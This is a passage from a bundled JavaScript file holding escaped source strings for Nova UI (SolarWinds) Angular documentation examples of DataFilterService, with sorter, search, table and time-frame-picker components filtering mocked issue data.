obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    EventEmitter,\n    Injectable,\n    OnDestroy,\n    OnInit,\n    Output,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport moment from "moment/moment";\nimport { Subject, Subscription } from "rxjs";\nimport { takeUntil } from "rxjs/operators";\n\nimport {\n    DataFilterService,\n    IFilter,\n    IFilterPub,\n    IMenuItem,\n    INovaFilteringOutputs,\n    IRange,\n    ISorterChanges,\n    ITimeframe,\n    LocalFilteringDataSource,\n    SearchComponent,\n    SearchService,\n    SorterComponent,\n    SorterDirection,\n    TimeframeService,\n} from "@nova-ui/bits";\n\nimport { ListModel, LIST_DATA, TableModel, TABLE_DATA } from "./mocked-data";\n\n// custom data sources used for filtering\n@Injectable()\nexport class ListDatasource\n    extends LocalFilteringDataSource<ListModel>\n    implements OnDestroy\n{\n    private onDestroy$ = new Subject<void>();\n    constructor(\n        searchService: SearchService,\n        private filterService: DataFilterService\n    ) {\n        super(searchService);\n        // Subscribe to service, and automatically unsubscribe upon `ngOnDestroy`\n        this.filterService.filteringSubject\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe(() => {\n                this.applyFilters();\n            });\n        super.setData(LIST_DATA);\n    }\n\n    public async getFilteredData(): Promise<INovaFilteringOutputs> {\n        const filters = this.filterService.getFilters();\n        const timeFramePickerFilter = filters.timeFramePicker;\n        const filteredData = await super.getFilteredData(filters);\n        let nextChunk: any[] | undefined = filteredData.repeat?.itemsSource;\n        // TIME FRAME PICKER FILTERING\n        if (timeFramePickerFilter) {\n            nextChunk = nextChunk?.filter(\n                (item: ListModel) =>\n                    item.date.isBetween(\n                        timeFramePickerFilter.value.start,\n                        timeFramePickerFilter.value.end\n                    ) ||\n                    item.date.isSame(timeFramePickerFilter.value.start) ||\n                    item.date.isSame(timeFramePickerFilter.value.end)\n            );\n        }\n        if (!filteredData.repeat?.itemsSource || !nextChunk) {\n            throw new Error("filteredData.repeat is not defined");\n        }\n        filteredData.repeat.itemsSource = nextChunk;\n        return filteredData;\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n}\n\n@Injectable()\nexport class TableDatasource\n    extends LocalFilteringDataSource<TableModel>\n    implements OnDestroy\n{\n    private onDestroy$ = new Subject<void>();\n    constructor(\n        searchService: SearchService,\n        private filterService: DataFilterService\n    ) {\n        super(searchService);\n        // Subscribe to service, and automatically unsubscribe upon `ngOnDestroy`\n        this.filterService.filteringSubject\n            .pipe(takeUntil(this.onDestroy$))\n            .subscribe(() => {\n                this.applyFilters();\n            });\n        super.setData(TABLE_DATA);\n    }\n\n    public async getFilteredData(): Promise<INovaFilteringOutputs> {\n        const filters = this.filterService.getFilters();\n        const timeFramePickerFilter = filters.timeFramePicker;\n        const filteredData = await super.getFilteredData(filters);\n        if (!filteredData.repeat) {\n            throw new Error("filteredData.repeat is not defined");\n        }\n        let nextChunk = filteredData.repeat.itemsSource;\n        // TIME FRAME PICKER FILTERING\n        if (timeFramePickerFilter) {\n            nextChunk = nextChunk.filter(\n                (item: ListModel) =>\n                    item.date.isBetween(\n                        timeFramePickerFilter.value.start,\n                        timeFramePickerFilter.value.end\n                    ) ||\n                    item.date.isSame(timeFramePickerFilter.value.start) ||\n                    item.date.isSame(timeFramePickerFilter.value.end)\n            );\n        }\n        filteredData.repeat.itemsSource = nextChunk;\n        return filteredData;\n    }\n\n    public ngOnDestroy(): void {\n        this.onDestroy$.next();\n        this.onDestroy$.complete();\n    }\n}\n// parent component\n@Component({\n    selector: "nui-data-filter-basic-example",\n    templateUrl: "./data-filter-basic.example.component.html",\n    providers: [DataFilterService],\n})\nexport class DataFilterBasicExampleComponent implements AfterViewInit {\n    @ViewChild("timeFramePicker")\n    timeFramePicker: FilteringTimeFramePickerComponent;\n\n    constructor(private filterService: DataFilterService) {}\n\n    public ngAfterViewInit(): void {\n        // registering top-level filter which will be applied to all children\n        this.filterService.registerFilter({\n            timeFramePicker: {\n                componentInstance: this.timeFramePicker,\n            },\n        });\n        this.filterService.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.filterService.applyFilters();\n    }\n}\n\n// first child component\n@Component({\n    selector: "nui-data-filter-table-example",\n    template: `\n        <div style="border: 1px solid red" class="p-4">\n            <div class="mb-2">\n                <nui-sorter\n                    id="nui-data-filter-basic-sorter"\n                    [itemsSource]="sorterItems"\n                    [selectedItem]="sortBy"\n                    [sortDirection]="initialSortDirection"\n                    (sorterAction)="onSorterAction($event)"\n                >\n                </nui-sorter>\n            </div>\n\n            <table\n                nui-table\n                [dataSource]="dataSource"\n                id="nui-data-filter-basic-table"\n            >\n                <ng-container nuiColumnDef="position">\n                    <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                    <td nui-cell *nuiCellDef="let element">\n                        {{ element.position }}\n                    </td>\n                </ng-container>\n\n                <ng-container nuiColumnDef="issue">\n                    <th nui-header-cell *nuiHeaderCellDef i18n>Issue</th>\n                    <td nui-cell *nuiCellDef="let element">\n                        {{ element.issue }}\n                    </td>\n                </ng-container>\n\n                <ng-container nuiColumnDef="date">\n                    <th nui-header-cell *nuiHeaderCellDef i18n>Date</th>\n                    <td nui-cell *nuiCellDef="let element">\n                        {{ element.date | date : "EEEE, MMMM dd, yyyy" }}\n                    </td>\n                </ng-container>\n\n                <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n                <tr\n                    nui-row\n                    *nuiRowDef="let row; columns: displayedColumns"\n                    density="tiny"\n                ></tr>\n            </table>\n            <nui-data-filter-list-example></nui-data-filter-list-example>\n        </div>\n    `,\n    providers: [DataFilterService, TableDatasource],\n})\nexport class NuiDataFilterTableComponent implements AfterViewInit, OnDestroy {\n    public dataSource?: any[] = [];\n    public displayedColumns = ["position", "issue", "date"];\n\n    public readonly sorterItems: IMenuItem[] = [\n        {\n            title: $localize`Issue`,\n            value: "issue",\n        },\n    ];\n\n    public readonly initialSortDirection = SorterDirection.ascending;\n    public sortBy = this.sorterItems[0].value;\n\n    @ViewChild(SorterComponent) sorterComponent: SorterComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        private dataFilter: DataFilterService,\n        private dataSourceService: TableDatasource\n    ) {}\n\n    public ngAfterViewInit(): void {\n        // this filter will be applied in this component and NuiDataFilterListComponent\n        this.dataFilter.registerFilter({\n            sorter: {\n                componentInstance: this.sorterComponent,\n            },\n        });\n        this.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                }\n            );\n    }\n\n    public applyFilters(): void {\n        this.dataFilter.applyFilters();\n    }\n\n    public onSorterAction(changes: ISorterChanges): void {\n        this.sortBy = changes.newValue.sortBy;\n        this.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n// second child component\n@Component({\n    selector: "nui-data-filter-list-example",\n    template: `\n        <div style="border: 1px solid green" class="p-4">\n            <div class="mb-2">\n                <nui-search\n                    id="nui-data-filter-basic-search"\n                    (inputChange)="applyFilters()"\n                    (cancel)="applyFilters()"\n                    #listSearch\n                >\n                </nui-search>\n            </div>\n\n            <nui-repeat\n                id="nui-data-filter-basic-repeat"\n                [itemsSource]="state.repeat?.itemsSource"\n                [repeatItemTemplateRef]="repeatItemTemplate"\n                #filteringRepeat\n            >\n            </nui-repeat>\n\n            <ng-template #repeatItemTemplate let-item="item">\n                <div>\n                    {{ item.issue }} -\n                    {{ item.date | date : "EEEE, MMMM dd, yyyy" }}\n                </div>\n            </ng-template>\n        </div>\n    `,\n    providers: [DataFilterService, ListDatasource],\n})\nexport class NuiDataFilterListComponent implements AfterViewInit, OnDestroy {\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n    };\n\n    @ViewChild("listSearch") search: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        private filterService: DataFilterService,\n        private dataSourceService: ListDatasource\n    ) {}\n\n    public ngAfterViewInit(): void {\n        // this filter will be applied only in this component\n        this.filterService.registerFilter({\n            search: {\n                componentInstance: this.search,\n            },\n        });\n        this.filterService.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                }\n            );\n    }\n\n    public applyFilters(): void {\n        this.filterService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n// custom time frame picker\n@Component({\n    selector: "nui-filtering-time-frame-picker",\n    template: `\n        <nui-popover\n            trigger="click"\n            id="nui-data-filter-basic-time-frame-picker-popover"\n            [template]="popoverTimeFramePicker"\n            [hasPadding]="false"\n            [closePopover]="closePopoverSubject"\n            [modal]="true"\n        >\n            <span class="nui-text-link" style="cursor: pointer;">{{\n                tf | timeFrame\n            }}</span>\n        </nui-popover>\n\n        <ng-template #popoverTimeFramePicker>\n            <div class="m-3">\n                <nui-time-frame-picker\n                    [startModel]="tf"\n                    (changed)="updateTf($event)"\n                    [maxDate]="maxDate"\n                    [minDate]="minDate"\n                >\n                </nui-time-frame-picker>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    nui-button\n                    id="nui-data-filter-basic-time-frame-picker-cancel-btn"\n                    type="button"\n                    displayStyle="action"\n                    (click)="cancelPopover()"\n                    i18n\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    id="nui-data-filter-basic-time-frame-picker-apply-btn"\n                    type="button"\n                    displayStyle="primary"\n                    (click)="confirmPopover()"\n                    i18n\n                >\n                    Apply\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n    `,\n    encapsulation: ViewEncapsulation.None,\n})\nexport class FilteringTimeFramePickerComponent implements IFilterPub, OnInit {\n    @Output() timeFrameChanged: EventEmitter<any> = new EventEmitter();\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe = {\n        startDatetime: moment("01/01/2019", "L"),\n        endDatetime: moment("02/12/2019", "L"),\n    };\n\n    public minDate = moment("12/01/2018", "L"); // "L" is "MM/DD/YYY" in moment.js\n    public maxDate = moment();\n\n    public showFooter: boolean = false;\n\n    constructor(public timeframeService: TimeframeService) {}\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public ngOnInit(): void {\n        this.acceptedTimeframe = this.tf;\n    }\n\n    public updateTf(value: any): void {\n        this.tf = value;\n    }\n\n    public confirmPopover(): void {\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n        this.timeFrameChanged.emit(this.acceptedTimeframe);\n    }\n\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public getFilters(): IFilter<IRange<Date>> {\n        return {\n            type: "range",\n            value: {\n                start: this.acceptedTimeframe.startDatetime.toDate(),\n                end: this.acceptedTimeframe.endDatetime.toDate(),\n            },\n        };\n    }\n}\n'},36551:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport moment from "moment/moment";\n\nexport interface ListModel {\n    issue: string;\n    date: moment.Moment;\n}\n\nexport interface TableModel extends ListModel {\n    position: number;\n}\n\nexport const LIST_DATA: ListModel[] = [\n    {\n        issue: "Issue 1",\n        date: moment("01/02/2019", "MM/DD/YYYY"),\n    },\n    {\n        issue: "Issue 2",\n        date: moment("01/11/2019", "MM/DD/YYYY"),\n    },\n    {\n        issue: "Issue 3",\n        date: moment("02/12/2019", "MM/DD/YYYY"),\n    },\n    {\n        issue: "Issue 4",\n        date: moment("01/02/2019", "MM/DD/YYYY"),\n    },\n    {\n        issue: "Issue 5",\n        date: moment("02/10/2019", "MM/DD/YYYY"),\n    },\n];\n\nexport const TABLE_DATA: TableModel[] = [\n    {\n        position: 1,\n        issue: "Issue 1",\n        date: moment("01/02/2019", "MM/DD/YYYY"),\n    },\n    {\n        position: 2,\n        issue: "Issue 2",\n        date: moment("01/11/2019", "MM/DD/YYYY"),\n    },\n    {\n        position: 3,\n        issue: "Issue 3",\n        date: moment("02/12/2019", "MM/DD/YYYY"),\n    },\n    {\n        position: 4,\n        issue: "Issue 4",\n        date: moment("01/02/2019", "MM/DD/YYYY"),\n    },\n    {\n        position: 5,\n        issue: "Issue 5",\n        date: moment("02/10/2019", "MM/DD/YYYY"),\n    },\n];\n'},74422:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>DataFilterService</code> provides a mechanism of filtering data in\n    hierarchical components.\n</p>\n<h2>Basic Usage</h2>\n<p>To use <code>DataFilterService</code> do following steps:</p>\n<ol>\n    <li>\n        Provide <code>DataFilterService</code> into providers of your parent and\n        child components.\n    </li>\n    <li>\n        Register filters using\n        <code>this.filterService.registerFilter()</code> function and pass\n        <a href="../interfaces/IFilteringParticipants.html" target="_blank"\n            ><code>IFilteringParticipants</code></a\n        >\n        as a parameter.\n    </li>\n    <li>\n        Call <code>this.filterService.applyFilters()</code> function to apply\n        filters on components which are used for filtering.\n    </li>\n    <li>\n        Create custom <code>DataSource</code> (in our case we are extending\n        <a href="../injectables/LocalFilteringDataSource.html" target="_blank"\n            ><code>LocalFilteringDataSource</code></a\n        >) and inside that service inject <code>DataFilterService</code> and\n        subscribe to <code>this.filterService.filteringSubject</code> in\n        constructor of your <code>DataSource</code> service.\n        <code>this.filterService.filteringSubject</code> will be emitted when\n        <code>this.filterService.applyFilters()</code>\n        will be called in your component.\n    </li>\n    <li>\n        Perform filtering in your <code>DataSource</code> service. To make this\n        happen in your custom <code>DataSource</code> use\n        <code>this.filterService.getFilters()</code> function to get filter\n        state of your component. You can see it in action in the example below\n        (in <code>getFilteredData</code> function in <code>DataSource</code>).\n    </li>\n</ol>\n<p>\n    More details about multi-level filtering mechanism are available\n    <a\n        target="_blank"\n        href="https://cp.solarwinds.com/pages/viewpage.action?spaceKey=NU&title=Filterable+Datasources"\n        >here</a\n    >.\n</p>\n<nui-example-wrapper\n    filenamePrefix="data-filter-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-data-filter-basic-example></nui-data-filter-basic-example>\n</nui-example-wrapper>\n<h2>Isolated Filters</h2>\n<p>\n    In this example you can see two components with\n    <code>nui-search</code> which are independent from each other. This is\n    possible because of properly created component tree. Each component has its\n    own <code>DataFilterService</code>. This <code>DataFilterService</code> has\n    reference to its parent and doesn\'t have any references to sibling\n    components. It happens because in the example below we injected\n    <code>DataFilterService</code> in providers of each component and Angular\n    creates correct DI tree.\n</p>\n<nui-example-wrapper\n    filenamePrefix="data-filter-isolated"\n    exampleTitle="Isolated Filters"\n>\n    <nui-data-filter-isolated-example></nui-data-filter-isolated-example>\n</nui-example-wrapper>\n'},54306:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-data-filter-example",\n    templateUrl: "./data-filter-docs.example.component.html",\n})\nexport class DataFilterDocsExampleComponent {}\n'},35730:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="border: 1px solid black">\n    <nui-filtering-isolated-time-frame-picker\n        (timeFrameChanged)="applyFilters()"\n        #timeFramePicker\n    ></nui-filtering-isolated-time-frame-picker>\n    <nui-divider size="extra-small"></nui-divider>\n    <div class="d-flex">\n        <div class="col m-3 pt-3" style="border: 1px solid red">\n            <nui-data-filter-isolated-table-example></nui-data-filter-isolated-table-example>\n        </div>\n        <div class="col m-3 pt-3" style="border: 1px solid green">\n            <nui-data-filter-isolated-list-example></nui-data-filter-isolated-list-example>\n        </div>\n    </div>\n</div>\n'},44142:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    AfterViewInit,\n    Component,\n    EventEmitter,\n    OnDestroy,\n    OnInit,\n    Output,\n    ViewChild,\n    ViewEncapsulation,\n} from "@angular/core";\nimport moment from "moment/moment";\nimport { Subject, Subscription } from "rxjs";\n\nimport {\n    DataFilterService,\n    IFilter,\n    IFilterPub,\n    INovaFilteringOutputs,\n    IRange,\n    ITimeframe,\n    SearchComponent,\n} from "@nova-ui/bits";\n\nimport {\n    FilteringTimeFramePickerComponent,\n    ListDatasource,\n    TableDatasource,\n} from "../data-filter-basic/data-filter-basic.example.component";\n\n@Component({\n    selector: "nui-data-filter-isolated-example",\n    templateUrl: "data-filter-isolated.example.component.html",\n    providers: [DataFilterService],\n})\nexport class DataFilterIsolatedExampleComponent implements AfterViewInit {\n    @ViewChild("timeFramePicker")\n    timeFramePicker: FilteringTimeFramePickerComponent;\n\n    constructor(private filterService: DataFilterService) {}\n\n    public ngAfterViewInit(): void {\n        this.filterService.registerFilter({\n            timeFramePicker: {\n                componentInstance: this.timeFramePicker,\n            },\n        });\n        this.filterService.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.filterService.applyFilters();\n    }\n}\n\n@Component({\n    selector: "nui-data-filter-isolated-table-example",\n    template: `\n        <div class="mb-2">\n            <nui-search\n                id="nui-data-filter-isolated-table-search"\n                class="d-flex justify-content-end flex-grow-1"\n                (inputChange)="applyFilters()"\n                (cancel)="applyFilters()"\n                #tableSearch\n            ></nui-search>\n        </div>\n        <table\n            nui-table\n            [dataSource]="tableData"\n            id="nui-data-filter-isolated-table"\n        >\n            <ng-container nuiColumnDef="position">\n                <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.position }}\n                </td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="issue">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Issue</th>\n                <td nui-cell *nuiCellDef="let element">{{ element.issue }}</td>\n            </ng-container>\n\n            <ng-container nuiColumnDef="date">\n                <th nui-header-cell *nuiHeaderCellDef i18n>Date</th>\n                <td nui-cell *nuiCellDef="let element">\n                    {{ element.date | date : "EEEE, MMMM dd, yyyy" }}\n                </td>\n            </ng-container>\n\n            <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n            <tr\n                nui-row\n                *nuiRowDef="let row; columns: displayedColumns"\n                density="compact"\n            ></tr>\n        </table>\n    `,\n    providers: [DataFilterService, TableDatasource],\n})\nexport class NuiDataFilterIsolatedTableComponent\n    implements AfterViewInit, OnDestroy\n{\n    public tableData?: any[] = [];\n    public displayedColumns = ["position", "issue", "date"];\n    @ViewChild("tableSearch") search: SearchComponent;\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        private dataFilter: DataFilterService,\n        private dataSourceService: TableDatasource\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.dataFilter.registerFilter({\n            search: {\n                componentInstance: this.search,\n            },\n        });\n        this.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.tableData = data.repeat?.itemsSource;\n                }\n            );\n    }\n\n    public applyFilters(): void {\n        this.dataFilter.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n@Component({\n    selector: "nui-data-filter-isolated-list-example",\n    template: `\n        <div class="mb-2">\n            <nui-search\n                id="nui-data-filter-isolated-list-search"\n                class="d-flex justify-content-end flex-grow-1"\n                (inputChange)="applyFilters()"\n                (cancel)="applyFilters()"\n                #listSearch\n            >\n            </nui-search>\n        </div>\n\n        <nui-repeat\n            id="nui-data-filter-list-isolated-repeat"\n            [itemsSource]="state.repeat?.itemsSource"\n            [repeatItemTemplateRef]="repeatItemTemplate"\n            #filteringRepeat\n        >\n        </nui-repeat>\n\n        <ng-template #repeatItemTemplate let-item="item">\n            <div>\n                {{ item.issue }} -\n                {{ item.date | date : "EEEE, MMMM dd, yyyy" }}\n            </div>\n        </ng-template>\n    `,\n    providers: [DataFilterService, ListDatasource],\n})\nexport class NuiDataFilterIsolatedListComponent\n    implements AfterViewInit, OnDestroy\n{\n    public state: INovaFilteringOutputs = {\n        repeat: {\n            itemsSource: [],\n        },\n    };\n    @ViewChild("listSearch") search: SearchComponent;\n    private outputsSubscription: Subscription;\n\n    constructor(\n        private filterService: DataFilterService,\n        private dataSourceService: ListDatasource\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.filterService.registerFilter({\n            search: {\n                componentInstance: this.search,\n            },\n        });\n        this.filterService.applyFilters();\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.state = data;\n                }\n            );\n    }\n\n    public applyFilters(): void {\n        this.filterService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n@Component({\n    selector: "nui-filtering-isolated-time-frame-picker",\n    template: `\n        <nui-popover\n            trigger="click"\n            id="nui-data-filter-isolated-time-frame-picker-popover"\n            [template]="popoverTimeFramePicker"\n            [hasPadding]="false"\n            [closePopover]="closePopoverSubject"\n            [modal]="true"\n        >\n            <button nui-button type="button" displayStyle="action">\n                {{ tf | timeFrame }}\n            </button>\n        </nui-popover>\n\n        <ng-template #popoverTimeFramePicker>\n            <div class="m-3">\n                <nui-time-frame-picker\n                    [startModel]="tf"\n                    (changed)="updateTf($event)"\n                    [maxDate]="maxDate"\n                    [minDate]="minDate"\n                >\n                </nui-time-frame-picker>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    nui-button\n                    id="nui-data-filter-isolated-time-frame-picker-cancel-btn"\n                    type="button"\n                    displayStyle="action"\n                    (click)="cancelPopover()"\n                    i18n\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    id="nui-data-filter-isolated-time-frame-picker-apply-btn"\n                    type="button"\n                    displayStyle="primary"\n                    (click)="confirmPopover()"\n                    i18n\n                >\n                    Apply\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n    `,\n    encapsulation: ViewEncapsulation.None,\n})\nexport class FilteringIsolatedTimeFramePickerComponent\n    implements IFilterPub, OnInit\n{\n    @Output() timeFrameChanged: EventEmitter<any> = new EventEmitter();\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe = {\n        startDatetime: moment("01/01/2019", "L"),\n        endDatetime: moment("02/12/2019", "L"),\n    };\n\n    public minDate = moment("12/01/2018", "L"); // "L" is "MM/DD/YYY" in moment.js\n    public maxDate = moment();\n\n    public showFooter: boolean = false;\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public ngOnInit(): void {\n        this.acceptedTimeframe = this.tf;\n    }\n\n    public updateTf(value: any): void {\n        this.tf = value;\n    }\n\n    public confirmPopover(): void {\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n        this.timeFrameChanged.emit(this.acceptedTimeframe);\n    }\n\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public getFilters(): IFilter<IRange<Date>> {\n        return {\n            type: "range",\n            value: {\n                start: this.acceptedTimeframe.startDatetime.toDate(),\n                end: this.acceptedTimeframe.endDatetime.toDate(),\n            },\n        };\n    }\n}\n'},68191:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<nui-data-filter-basic-example></nui-data-filter-basic-example>\n<nui-data-filter-isolated-example></nui-data-filter-isolated-example>\n"},96860:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-data-filter-example",\n    templateUrl: "./data-filter-test.component.html",\n})\nexport class DataFilterTestComponent {}\n'},19180:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  